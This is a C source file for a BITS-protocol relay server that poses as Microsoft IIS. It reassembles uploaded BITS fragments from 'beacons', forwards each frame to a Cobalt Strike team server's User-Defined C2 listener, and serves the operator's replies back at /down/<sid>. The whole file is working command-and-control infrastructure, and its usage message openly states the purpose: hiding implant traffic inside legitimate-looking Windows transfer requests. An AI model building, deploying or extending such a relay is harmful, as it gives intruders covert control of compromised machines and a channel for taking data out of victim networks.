#define _POSIX_C_SOURCE 200809L

#include <arpa/inet.h>
#include <ctype.h>
#include <errno.h>
#include <netinet/in.h>
#include <signal.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <time.h>
#include <unistd.h>
#include <pthread.h>

#define MAX_SESSIONS   64
#define MAX_UPLOAD     (8u * 1024u * 1024u)
#define HDR_MAX        (32 * 1024)
#define BODY_CHUNK     (64 * 1024)
#define SESSION_TTL    3600

#define BITS_PROTO_GUID "{7df0354d-249b-430f-820d-3d2a9bef4931}"

typedef struct {
    int      used;
    char     sid[64];
    char     txid[64];
    char     guid[80];
    unsigned char *buf;
    size_t   total;
    size_t   have;
    time_t   created;
    int      txs_forwarded;
} session_t;

static session_t g_sessions[MAX_SESSIONS];
static const char *g_root = "relay";
static int g_port = 8090;
static volatile sig_atomic_t g_stop = 0;

static void logf_(const char *fmt, ...);

static const char *g_ts_addr = NULL;
static int g_ts_port = 0;
static int g_verbose = 0;
static int g_quiet = 0;
static const char *g_reply_base = NULL;

static pthread_mutex_t g_lock = PTHREAD_MUTEX_INITIALIZER;

#define MAX_TSCONNS 64
typedef struct {
    char sid[64];
    int fd;
} tsconn_t;
static tsconn_t g_tsconns[MAX_TSCONNS];

#define MAX_PENDING 64
typedef struct {
    char sid[64];
    unsigned char *data;
    size_t len;
    int used;
} pending_t;
static pending_t g_pending[MAX_PENDING];

static int ts_send_all(int fd, const unsigned char *buf, size_t len) {
    size_t off = 0;
    while (off < len) {
        ssize_t n = send(fd, buf + off, len - off, 0);
        if (n <= 0) return -1;
        off += (size_t)n;
    }
    return 0;
}

static int ts_recv_all(int fd, unsigned char *buf, size_t len) {
    size_t off = 0;
    while (off < len) {
        ssize_t n = recv(fd, buf + off, len - off, 0);
        if (n <= 0) return -1;
        off += (size_t)n;
    }
    return 0;
}

static tsconn_t *ts_get_conn(const char *sid) {
    for (int i = 0; i < MAX_TSCONNS; i++)
        if (g_tsconns[i].fd > 0 && strcmp(g_tsconns[i].sid, sid) == 0)
            return &g_tsconns[i];
    for (int i = 0; i < MAX_TSCONNS; i++) {
        if (g_tsconns[i].fd <= 0) {
            struct sockaddr_in a;
            memset(&a, 0, sizeof(a));
            a.sin_family = AF_INET;
            a.sin_port = htons((uint16_t)g_ts_port);
            a.sin_addr.s_addr = inet_addr(g_ts_addr ? g_ts_addr : "127.0.0.1");
            int fd = socket(AF_INET, SOCK_STREAM, 0);
            if (fd < 0) return NULL;
            struct timeval tv = {30, 0};
            setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
            setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
            if (connect(fd, (struct sockaddr *)&a, sizeof(a)) != 0) {
                close(fd);
                return NULL;
            }
            unsigned char hs[6] = {2, 0, 0, 0, 'g', 'o'};
            if (ts_send_all(fd, hs, sizeof(hs)) != 0) {
                close(fd);
                return NULL;
            }
            snprintf(g_tsconns[i].sid, sizeof(g_tsconns[i].sid), "%s", sid);
            g_tsconns[i].fd = fd;
            logf_("[ts] connection opened for sid=%s -> %s:%d", sid, g_ts_addr, g_ts_port);
            return &g_tsconns[i];
        }
    }
    return NULL;
}

static void ts_close_conn(tsconn_t *c) {
    if (!c || c->fd <= 0) return;
    logf_("[ts] connection closed for sid=%s", c->sid);
    close(c->fd);
    c->fd = -1;
}

static pending_t *pending_get(const char *sid) {
    for (int i = 0; i < MAX_PENDING; i++)
        if (g_pending[i].used && strcmp(g_pending[i].sid, sid) == 0)
            return &g_pending[i];
    for (int i = 0; i < MAX_PENDING; i++) {
        if (!g_pending[i].used) {
            memset(&g_pending[i], 0, sizeof(pending_t));
            snprintf(g_pending[i].sid, sizeof(g_pending[i].sid), "%s", sid);
            g_pending[i].used = 1;
            return &g_pending[i];
        }
    }
    return NULL;
}

static void ts_forward_and_cache(const char *sid, const unsigned char *frame, size_t len);

static long long now_ms(void);
static int write_file_mkdir(const char *path, const unsigned char *data, size_t len);

static void deliver_frame(session_t *s) {
    if (s->txs_forwarded) return;
    s->txs_forwarded = 1;
    char dir[512], file[640];
    snprintf(dir, sizeof(dir), "%s/inbox/%s", g_root, s->sid);
    mkdir(dir, 0755);
    snprintf(file, sizeof(file), "%s/%lld_%s.bin", dir, now_ms(), s->txid);
    if (write_file_mkdir(file, s->buf, s->have) == 0) {
        logf_("[bits] message delivered: %s (%zu bytes, sid=%s)",
              file, s->have, s->sid);
    } else {
        logf_("[bits] inbox write FAILED for sid=%s: %s", s->sid, strerror(errno));
    }
    if (g_ts_port > 0)
        ts_forward_and_cache(s->sid, s->buf, s->have);
}

static void pending_drop(const char *sid) {
    for (int i = 0; i < MAX_PENDING; i++) {
        if (g_pending[i].used && strcmp(g_pending[i].sid, sid) == 0) {
            free(g_pending[i].data);
            g_pending[i].data = NULL;
            g_pending[i].used = 0;
        }
    }
}

static void ts_forward_and_cache(const char *sid, const unsigned char *frame, size_t len) {
    tsconn_t *c = ts_get_conn(sid);
    if (!c) {
        logf_("[ts] no connection for sid=%s (team server down?)", sid);
        pending_t *p = pending_get(sid);
        if (p) { free(p->data); p->data = NULL; p->len = 1; }
        return;
    }
    if (ts_send_all(c->fd, frame, len) != 0) {
        logf_("[ts] send failed for sid=%s; reconnecting next time", sid);
        ts_close_conn(c);
        pending_t *p = pending_get(sid);
        if (p) { free(p->data); p->data = NULL; p->len = 1; }
        return;
    }
    unsigned char lbuf[4];
    if (ts_recv_all(c->fd, lbuf, 4) != 0) {
        logf_("[ts] reply header read failed for sid=%s", sid);
        ts_close_conn(c);
        pending_t *p = pending_get(sid);
        if (p) { free(p->data); p->data = NULL; p->len = 1; }
        return;
    }
    uint32_t rlen = (uint32_t)lbuf[0] | (uint32_t)lbuf[1] << 8 | (uint32_t)lbuf[2] << 16 | (uint32_t)lbuf[3] << 24;
    if (rlen > 10u * 1024u * 1024u) {
        logf_("[ts] oversized reply for sid=%s (%u bytes)", sid, rlen);
        ts_close_conn(c);
        pending_t *p = pending_get(sid);
        if (p) { free(p->data); p->data = NULL; p->len = 1; }
        return;
    }
    unsigned char *body = malloc(rlen ? rlen : 1);
    if (!body || (rlen && ts_recv_all(c->fd, body, rlen) != 0)) {
        free(body);
        ts_close_conn(c);
        pending_t *p = pending_get(sid);
        if (p) { free(p->data); p->data = NULL; p->len = 1; }
        return;
    }
    pending_t *p = pending_get(sid);
    if (p) {
        free(p->data);
        p->data = malloc(rlen + 4);
        if (p->data) {
            memcpy(p->data, lbuf, 4);
            memcpy(p->data + 4, body, rlen);
            p->len = rlen + 4;
        } else {
            p->data = NULL;
            p->len = 1;
        }
        logf_("[ts] reply cached for sid=%s (%u bytes)", sid, rlen);
    }
    free(body);
}

static void logf_(const char *fmt, ...) {
    char ts[32];
    time_t now = time(NULL);
    struct tm tm;
    localtime_r(&now, &tm);
    strftime(ts, sizeof(ts), "%H:%M:%S", &tm);
    va_list ap;
    va_start(ap, fmt);
    fprintf(stdout, "%s ", ts);
    vfprintf(stdout, fmt, ap);
    fputc('\n', stdout);
    fflush(stdout);
    va_end(ap);
}

static void on_signal(int sig) { (void)sig; g_stop = 1; }

static void sanitize(const char *in, char *out, size_t out_sz) {
    size_t o = 0;
    for (const char *p = in; *p && o + 1 < out_sz; p++) {
        char c = *p;
        if (!(isalnum((unsigned char)c) || c == '-' || c == '_' || c == '.'))
            c = '_';
        out[o++] = c;
    }
    out[o] = 0;
}

static int write_all(int fd, const char *buf, size_t len) {
    size_t off = 0;
    while (off < len) {
        ssize_t n = send(fd, buf + off, len - off, 0);
        if (n <= 0) return -1;
        off += (size_t)n;
    }
    return 0;
}

static int send_response(int fd, int code, const char *reason,
                         const char *extra_headers, const char *body, size_t body_len) {
    char head[1024];
    int n = snprintf(head, sizeof(head),
                     "HTTP/1.1 %d %s\r\n"
                     "Server: Microsoft-IIS/10.0\r\n"
                     "%s"
                     "Content-Length: %zu\r\n"
                     "Connection: Keep-Alive\r\n\r\n",
                     code, reason, extra_headers ? extra_headers : "", body_len);
    if (n < 0 || write_all(fd, head, (size_t)n) != 0) return -1;
    if (body_len && write_all(fd, body, body_len) != 0) return -1;
    return 0;
}

static int send_ack(int fd, int code, const char *reason, const char *extra) {
    return send_response(fd, code, reason, extra ? extra : "BITS-Packet-Type: Ack\r\n", NULL, 0);
}

static int header_get(const char *headers, const char *name, char *out, size_t out_sz) {
    size_t nlen = strlen(name);
    const char *line = headers;
    while (line && *line) {
        const char *eol = strstr(line, "\r\n");
        size_t llen = eol ? (size_t)(eol - line) : strlen(line);
        if (llen > nlen + 1 && strncasecmp(line, name, nlen) == 0 && line[nlen] == ':') {
            const char *v = line + nlen + 1;
            while (*v == ' ' || *v == '\t') v++;
            size_t vlen = llen - (size_t)(v - line);
            while (vlen > 0 && (v[vlen - 1] == ' ' || v[vlen - 1] == '\t')) vlen--;
            if (vlen >= out_sz) vlen = out_sz - 1;
            memcpy(out, v, vlen);
            out[vlen] = 0;
            return 0;
        }
        line = eol ? eol + 2 : NULL;
    }
    out[0] = 0;
    return -1;
}

static session_t *session_new(void) {
    time_t now = time(NULL);
    for (int i = 0; i < MAX_SESSIONS; i++) {
        session_t *s = &g_sessions[i];
        if (s->used && now - s->created > SESSION_TTL) {
            free(s->buf);
            memset(s, 0, sizeof(*s));
        }
        if (!s->used) {
            memset(s, 0, sizeof(*s));
            s->buf = malloc(MAX_UPLOAD);
            if (!s->buf) return NULL;
            s->used = 1;
            s->created = now;
            return s;
        }
    }
    return NULL;
}

static session_t *session_by_guid(const char *guid) {
    if (!guid || !*guid) return NULL;
    for (int i = 0; i < MAX_SESSIONS; i++)
        if (g_sessions[i].used && strcmp(g_sessions[i].guid, guid) == 0)
            return &g_sessions[i];
    return NULL;
}

static void session_free(session_t *s) {
    if (!s) return;
    free(s->buf);
    memset(s, 0, sizeof(*s));
}

static void gen_guid(char out[80]) {
    snprintf(out, 80, "%lu%lu", (unsigned long)rand(), (unsigned long)time(NULL));
}

static long long now_ms(void) {
    struct timeval tv;
    gettimeofday(&tv, NULL);
    return (long long)tv.tv_sec * 1000 + tv.tv_usec / 1000;
}

static int ensure_dirs(void) {
    char path[512];
    snprintf(path, sizeof(path), "%s/inbox", g_root);
    if (mkdir(g_root, 0755) != 0 && errno != EEXIST) return -1;
    if (mkdir(path, 0755) != 0 && errno != EEXIST) return -1;
    snprintf(path, sizeof(path), "%s/outbox", g_root);
    if (mkdir(path, 0755) != 0 && errno != EEXIST) return -1;
    return 0;
}

static int write_file_mkdir(const char *path, const unsigned char *data, size_t len) {
    FILE *f = fopen(path, "wb");
    if (!f) return -1;
    size_t w = fwrite(data, 1, len, f);
    fclose(f);
    return w == len ? 0 : -1;
}

static void handle_bits_upload(int fd, const char *method, const char *path,
                               const char *headers, unsigned char *body, size_t body_len) {
    (void)method;
    char ptype[64];
    header_get(headers, "BITS-Packet-Type", ptype, sizeof(ptype));

    if (strcmp(ptype, "Create-Session") == 0) {
        char sid[64] = "", txid[64] = "";
        if (sscanf(path, "/up/%63[^/]/%63s", sid, txid) != 2 || !sid[0] || !txid[0]) {
            send_ack(fd, 400, "Bad Request", "BITS-Error-Code: 0x80190194\r\n");
            return;
        }
        session_t *s = session_new();
        if (!s) {
            send_ack(fd, 503, "Service Unavailable", "BITS-Error-Code: 0x80190194\r\n");
            return;
        }
        sanitize(sid, s->sid, sizeof(s->sid));
        sanitize(txid, s->txid, sizeof(s->txid));
        gen_guid(s->guid);
        char extra[256];
        snprintf(extra, sizeof(extra),
                 "BITS-Packet-Type: Ack\r\n"
                 "BITS-Protocol: %s\r\n"
                 "BITS-Session-Id: %s\r\n"
                 "Accept-Encoding: identity\r\n",
                 BITS_PROTO_GUID, s->guid);
        logf_("[bits] session %s opened for sid=%s tx=%s", s->guid, s->sid, s->txid);
        send_response(fd, 200, "OK", extra, NULL, 0);
        return;
    }

    if (strcmp(ptype, "Fragment") == 0) {
        char guid[80];
        header_get(headers, "BITS-Session-Id", guid, sizeof(guid));
        session_t *s = session_by_guid(guid);
        if (!s) {
            send_ack(fd, 400, "Bad Request", "BITS-Error-Code: 0x80190194\r\n");
            return;
        }
        char range[128] = "";
        header_get(headers, "Content-Range", range, sizeof(range));
        unsigned long start = 0, end = 0, total = 0;
        const char *digits = range;
        while (*digits && (*digits < '0' || *digits > '9')) digits++;
        if (sscanf(digits, "%lu-%lu/%lu", &start, &end, &total) != 3) {
            send_ack(fd, 400, "Bad Request", "BITS-Error-Code: 0x80190194\r\n");
            return;
        }
        if (total > MAX_UPLOAD || end < start || end + 1 - start != body_len ||
            (start != s->have)) {
            logf_("[bits] bad fragment for %s: range=%s have=%zu len=%zu",
                  s->guid, range, s->have, body_len);
            send_ack(fd, 416, "Range Not Satisfiable", "BITS-Error-Code: 0x801901f0\r\n");
            return;
        }
        if (end + 1 > MAX_UPLOAD) {
            send_ack(fd, 413, "Payload Too Large", "BITS-Error-Code: 0x80190194\r\n");
            return;
        }
        memcpy(s->buf + start, body, body_len);
        s->have = end + 1;
        s->total = total;
        {
            static char extra[600];
            size_t pos = (size_t)snprintf(extra, sizeof(extra),
                     "BITS-Packet-Type: Ack\r\nBITS-Session-Id: %s\r\n"
                     "BITS-Received-Content-Range: %lu\r\n",
                     s->guid, (unsigned long)(end + 1));
            if (end + 1 == total) {
                deliver_frame(s);
                char host[256] = "";
                header_get(headers, "Host", host, sizeof(host));
                char base[512];
                if (g_reply_base)
                    snprintf(base, sizeof(base), "%s", g_reply_base);
                else
                    snprintf(base, sizeof(base), "http://%s",
                             host[0] ? host : "127.0.0.1");
                snprintf(extra + pos, sizeof(extra) - pos,
                         "BITS-Reply-URL: %s/down/%s\r\n", base, s->sid);
            }
            send_ack(fd, 200, "OK", extra);
        }
        return;
    }

    if (strcmp(ptype, "Close-Session") == 0) {
        char guid[80];
        header_get(headers, "BITS-Session-Id", guid, sizeof(guid));
        session_t *s = session_by_guid(guid);
        if (!s) {
            send_ack(fd, 400, "Bad Request", "BITS-Error-Code: 0x80190194\r\n");
            return;
        }
        if (s->have == s->total) {
            if (!s->txs_forwarded) deliver_frame(s);
            pending_drop(s->sid);
            send_ack(fd, 200, "OK", NULL);
        } else {
            logf_("[bits] session %s closed incomplete: %zu/%zu bytes",
                  s->guid, s->have, s->total);
            send_ack(fd, 400, "Bad Request", "BITS-Error-Code: 0x80190194\r\n");
        }
        session_free(s);
        return;
    }

    if (strcmp(ptype, "Ping") == 0) {
        send_ack(fd, 200, "OK", NULL);
        return;
    }

    if (strcmp(ptype, "Cancel-Session") == 0) {
        char guid[80];
        header_get(headers, "BITS-Session-Id", guid, sizeof(guid));
        session_t *s = session_by_guid(guid);
        logf_("[bits] session cancelled: %s", guid);
        session_free(s);
        send_ack(fd, 200, "OK", NULL);
        return;
    }

    logf_("[bits] unknown packet type '%s' from %s", ptype, path);
    send_ack(fd, 400, "Bad Request", "BITS-Error-Code: 0x80190194\r\n");
}

static void handle_download(int fd, const char *path, const char *headers) {
    char sid[64] = "";
    if (sscanf(path, "/down/%63s", sid) != 1 || !sid[0]) {
        send_response(fd, 404, "Not Found", NULL, NULL, 0);
        return;
    }
    char safe[64];
    sanitize(sid, safe, sizeof(safe));

    const unsigned char *data = NULL;
    size_t len = 0;
    for (int i = 0; i < MAX_PENDING; i++) {
        if (g_pending[i].used && strcmp(g_pending[i].sid, safe) == 0 &&
            g_pending[i].data) {
            data = g_pending[i].data;
            len = g_pending[i].len;
            break;
        }
    }
    if (!data) {
        send_response(fd, 404, "Not Found", NULL, NULL, 0);
        return;
    }

    size_t from = 0, to = len - 1;
    char range[128] = "";
    int ranged = 0;
    if (header_get(headers, "Range", range, sizeof(range)) == 0 &&
        strncmp(range, "bytes=", 6) == 0) {
        unsigned long a = 0, b = 0;
        if (sscanf(range + 6, "%lu-%lu", &a, &b) == 2 && b >= a && a < len) {
            from = a;
            if (b >= len) b = (unsigned long)(len - 1);
            to = b;
            ranged = 1;
        } else if (sscanf(range + 6, "%lu-", &a) == 1 && a < len) {
            from = a;
            to = len - 1;
            ranged = 1;
        } else if (sscanf(range + 6, "%lu-", &a) == 1 && a >= len) {
            send_response(fd, 416, "Range Not Satisfiable", NULL, NULL, 0);
            return;
        }
    }

    char extra[192];
    if (ranged)
        snprintf(extra, sizeof(extra),
                 "Content-Type: application/octet-stream\r\n"
                 "Content-Range: bytes %zu-%zu/%zu\r\n", from, to, len);
    else
        snprintf(extra, sizeof(extra), "Content-Type: application/octet-stream\r\n");
    logf_("[ts] reply served to sid=%s (%zu of %zu bytes%s)", safe, to - from + 1,
          len, ranged ? ", partial" : "");
    send_response(fd, ranged ? 206 : 200, ranged ? "Partial Content" : "OK",
                  extra, (const char *)(data + from), to - from + 1);
}

static void handle_connection(int fd) {
    struct timeval tv = {30, 0};
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    for (;;) {
        char req[HDR_MAX + 1];
        size_t used = 0;

        char *hdr_end = NULL;
        while (!hdr_end) {
            if (used >= HDR_MAX) return;
            ssize_t n = recv(fd, req + used, HDR_MAX - used, 0);
            if (n <= 0) return;
            used += (size_t)n;
            req[used] = 0;
            hdr_end = strstr(req, "\r\n\r\n");
        }
        *hdr_end = 0;

        char method[16] = "", path[512] = "", version[16] = "";
        if (sscanf(req, "%15s %511s %15s", method, path, version) != 3) return;

        char headers[HDR_MAX];
        {
            size_t hlen = (size_t)(hdr_end - req);
            if (hlen >= sizeof(headers)) hlen = sizeof(headers) - 1;
            memcpy(headers, req, hlen);
            headers[hlen] = 0;
        }

        size_t content_len = 0;
        char clen[32];
        if (header_get(headers, "Content-Length", clen, sizeof(clen)) == 0)
            content_len = (size_t)strtoul(clen, NULL, 10);
        if (content_len > MAX_UPLOAD) {
            send_response(fd, 413, "Payload Too Large", NULL, NULL, 0);
            return;
        }

        unsigned char *body = NULL;
        if (content_len > 0) {
            body = malloc(content_len);
            if (!body) return;
            size_t body_have = used - (size_t)(hdr_end + 4 - req);
            size_t head_bytes = (size_t)(hdr_end - req) + 4;
            body_have = used - head_bytes;
            if (body_have > content_len) body_have = content_len;
            if (body_have > 0) memcpy(body, req + head_bytes, body_have);
            while (body_have < content_len) {
                ssize_t n = recv(fd, body + body_have, content_len - body_have, 0);
                if (n <= 0) {
                    free(body);
                    return;
                }
                body_have += (size_t)n;
            }
        }

        if (!g_quiet) logf_("[http] %s %s (%zu-byte body)", method, path, content_len);
        if (g_verbose) {
            char oneline[512];
            size_t o = 0;
            for (char *q = req; *q && o + 1 < sizeof(oneline); q++) {
                oneline[o++] = (*q == '\r' || *q == '\n') ? ' ' : *q;
            }
            oneline[o] = 0;
            logf_("[wire] %s", oneline);
        }

        if ((strcmp(method, "BITS_POST") == 0 || strcmp(method, "POST") == 0) &&
            strncmp(path, "/up/", 4) == 0) {
            pthread_mutex_lock(&g_lock);
            handle_bits_upload(fd, method, path, headers, body, content_len);
            pthread_mutex_unlock(&g_lock);
        } else if (strcmp(method, "GET") == 0 && strncmp(path, "/down/", 6) == 0) {
            pthread_mutex_lock(&g_lock);
            handle_download(fd, path, headers);
            pthread_mutex_unlock(&g_lock);
        } else if (strcmp(method, "HEAD") == 0 && strncmp(path, "/down/", 6) == 0) {
            char sid[64] = "";
            if (sscanf(path, "/down/%63s", sid) == 1) {
                char safe[64];
                sanitize(sid, safe, sizeof(safe));
                pthread_mutex_lock(&g_lock);
                size_t len = 0;
                int found = 0;
                for (int i = 0; i < MAX_PENDING; i++) {
                    if (g_pending[i].used && strcmp(g_pending[i].sid, safe) == 0 &&
                        g_pending[i].data) {
                        len = g_pending[i].len;
                        found = 1;
                        break;
                    }
                }
                pthread_mutex_unlock(&g_lock);
                if (found) {
                    char head[256];
                    int hn = snprintf(head, sizeof(head),
                                      "HTTP/1.1 200 OK\r\n"
                                      "Server: Microsoft-IIS/10.0\r\n"
                                      "Content-Type: application/octet-stream\r\n"
                                      "Content-Length: %zu\r\n"
                                      "Accept-Ranges: bytes\r\n"
                                      "Connection: Keep-Alive\r\n\r\n", len);
                    if (hn > 0) write_all(fd, head, (size_t)hn);
                } else {
                    send_response(fd, 404, "Not Found", NULL, NULL, 0);
                }
            } else {
                send_response(fd, 404, "Not Found", NULL, NULL, 0);
            }
        } else if (strcmp(method, "PING") == 0) {
            send_ack(fd, 200, "OK", NULL);
        } else {
            send_response(fd, 404, "Not Found", NULL, NULL, 0);
        }
        free(body);
    }
}

static void *conn_thread(void *arg) {
    int fd = *(int *)arg;
    free(arg);
    handle_connection(fd);
    close(fd);
    return NULL;
}

int main(int argc, char **argv) {
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-port") == 0 && i + 1 < argc) g_port = atoi(argv[++i]);
        else if (strcmp(argv[i], "-root") == 0 && i + 1 < argc) g_root = argv[++i];
        else if (strcmp(argv[i], "-ts-addr") == 0 && i + 1 < argc) g_ts_addr = argv[++i];
        else if (strcmp(argv[i], "-ts-port") == 0 && i + 1 < argc) g_ts_port = atoi(argv[++i]);
        else if (strcmp(argv[i], "-v") == 0) g_verbose = 1;
        else if (strcmp(argv[i], "-q") == 0) g_quiet = 1;
        else if (strcmp(argv[i], "-reply-base") == 0 && i + 1 < argc) g_reply_base = argv[++i];
        else {
            fprintf(stderr, "usage: %s -ts-addr <ip> -ts-port <port> "
                            "[-port 8090] [-root relay] [-v] [-q]\n"
                            "  -ts-addr/-ts-port: the Cobalt Strike team server's "
                            "User-Defined C2 listener\n  -v: log raw request headers\n",
                    argv[0]);
            return 1;
        }
    }
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = on_signal;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    sigaction(SIGINT, &sa, NULL);
    sigaction(SIGTERM, &sa, NULL);
    signal(SIGPIPE, SIG_IGN);
    srand((unsigned)now_ms());

    if (g_ts_port <= 0 || !g_ts_addr) {
        fprintf(stderr,
                "fatal: this relay is UDC2-only — pass -ts-addr <ip> -ts-port <port>\n"
                "       (the Cobalt Strike team server's User-Defined C2 listener port)\n");
        return 1;
    }

    if (ensure_dirs() != 0) {
        fprintf(stderr, "fatal: cannot create mailbox under %s: %s\n", g_root, strerror(errno));
        return 1;
    }

    int lfd = socket(AF_INET, SOCK_STREAM, 0);
    if (lfd < 0) {
        perror("socket");
        return 1;
    }
    int one = 1;
    setsockopt(lfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    addr.sin_port = htons((uint16_t)g_port);
    if (bind(lfd, (struct sockaddr *)&addr, sizeof(addr)) != 0 || listen(lfd, 16) != 0) {
        fprintf(stderr, "fatal: bind/listen on port %d: %s\n", g_port, strerror(errno));
        return 1;
    }

    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);

    logf_("BITS UDC2 relay listening on 0.0.0.0:%d -> team server %s:%d", g_port, g_ts_addr, g_ts_port);
    logf_("uploads:  BITS upload protocol at /up/<sid>/<txid> (frames land in %s/inbox/ for audit)", g_root);
    logf_("replies:  team-server frames cached per beacon and served at /down/<sid>");

    while (!g_stop) {
        struct sockaddr_in peer;
        socklen_t peer_len = sizeof(peer);
        int cfd = accept(lfd, (struct sockaddr *)&peer, &peer_len);
        if (cfd < 0) {
            if (errno == EINTR) continue;
            perror("accept");
            continue;
        }
        if (!g_quiet) {
            char peer_ip[INET_ADDRSTRLEN] = "?";
            inet_ntop(AF_INET, &peer.sin_addr, peer_ip, sizeof(peer_ip));
            logf_("[conn] %s:%u", peer_ip, (unsigned)ntohs(peer.sin_port));
        }
        int *arg = malloc(sizeof(int));
        if (!arg) {
            close(cfd);
            continue;
        }
        *arg = cfd;
        pthread_t tid;
        if (pthread_create(&tid, &attr, conn_thread, arg) != 0) {
            close(cfd);
            free(arg);
        }
    }
    logf_("shutting down");
    close(lfd);
    return 0;
}
